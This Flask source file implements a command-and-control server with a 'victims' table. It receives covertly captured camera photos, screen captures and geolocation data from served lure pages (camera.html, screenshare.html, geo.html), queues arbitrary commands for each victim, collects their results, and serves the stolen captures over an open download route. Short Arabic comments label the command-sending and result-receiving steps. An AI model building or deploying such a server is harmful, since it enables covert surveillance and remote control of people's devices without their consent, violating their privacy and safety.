from flask import Flask, request, jsonify, render_template, send_from_directory
from werkzeug.utils import secure_filename
from datetime import datetime
import os
import sqlite3
import json

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'captures'

def get_db():
    conn = sqlite3.connect('c2.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id TEXT PRIMARY KEY,
                last_seen TIMESTAMP,
                pending_command TEXT,
                command_result TEXT
            )
        ''')
        db.commit()

init_db()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/camera.html')
def camera_page():
    return render_template('camera.html')

@app.route('/geo.html')
def geo_page():
    return render_template('geo.html')

@app.route('/screenshare.html')
def screenshare_page():
    return render_template('screenshare.html')

@app.route('/api/camera', methods=['POST'])
def capture_camera():
    victim_id = request.form.get('victim_id')
    image = request.files.get('image')

    if not victim_id or not image:
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400
    
    timestamp = datetime.utcnow().isoformat().replace(':', '-')
    filename = f"{victim_id}_{timestamp}.jpg"
    save_path = os.path.join(app.config['UPLOAD_FOLDER'], 'camera', filename)
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    image.save(save_path)
    
    return jsonify({'status': 'success', 'message': 'Camera image saved'})

@app.route('/api/screenshare', methods=['POST'])
def capture_screenshare():
    victim_id = request.form.get('victim_id')
    image = request.files.get('image')

    if not victim_id or not image:
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400
    
    timestamp = datetime.utcnow().isoformat().replace(':', '-')
    filename = f"{victim_id}_{timestamp}.jpg"
    save_path = os.path.join(app.config['UPLOAD_FOLDER'], 'screens', filename)
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    image.save(save_path)
    
    return jsonify({'status': 'success', 'message': 'Screenshare saved'})

@app.route('/api/geo', methods=['POST'])
def capture_geo():
    data = request.json
    victim_id = data.get('victim_id')
    geo_data = data.get('geo')

    if not victim_id or not geo_data:
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400
    
    timestamp = datetime.utcnow().isoformat()
    filename = f"{victim_id}_{timestamp}.json"
    save_path = os.path.join(app.config['UPLOAD_FOLDER'], 'geo', filename)
    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    
    with open(save_path, 'w') as f:
        json.dump(geo_data, f)
    
    return jsonify({'status': 'success', 'message': 'Geo location saved'})

@app.route('/api/command', methods=['GET', 'POST'])
def handle_command():
    if request.method == 'POST':
        # إرسال أمر جديد
        data = request.json
        victim_id = data.get('victim_id')
        command = data.get('command')

        if not victim_id or not command:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
        
        db = get_db()
        db.execute('UPDATE victims SET pending_command = ? WHERE id = ?', (command, victim_id))
        db.commit()
        
        return jsonify({'status': 'success', 'message': 'Command set'})
    
    else:
        # استلام نتيجة الأمر
        victim_id = request.args.get('victim_id')
        result = request.args.get('result')
        
        if victim_id and result:
            db = get_db()
            db.execute('UPDATE victims SET command_result = ? WHERE id = ?', (result, victim_id))
            db.commit()
            return jsonify({'status': 'success'})
        
        return jsonify({'status': 'error', 'message': 'No data received'}), 400

@app.route('/api/check', methods=['GET'])
def check_command():
    victim_id = request.args.get('victim_id')
    if not victim_id:
        return jsonify({'status': 'error', 'message': 'Missing victim_id'}), 400
    
    db = get_db()
    victim = db.execute('SELECT pending_command FROM victims WHERE id = ?', (victim_id,)).fetchone()
    
    if victim and victim['pending_command']:
        db.execute('UPDATE victims SET pending_command = NULL WHERE id = ?', (victim_id,))
        db.commit()
        return jsonify({
            'status': 'success',
            'command': victim['pending_command']
        })
    
    return jsonify({'status': 'empty'})

@app.route('/captures/<path:path>')
def download_file(path):
    return send_from_directory('captures', path)

if __name__ == '__main__':
    app.run(debug=True)
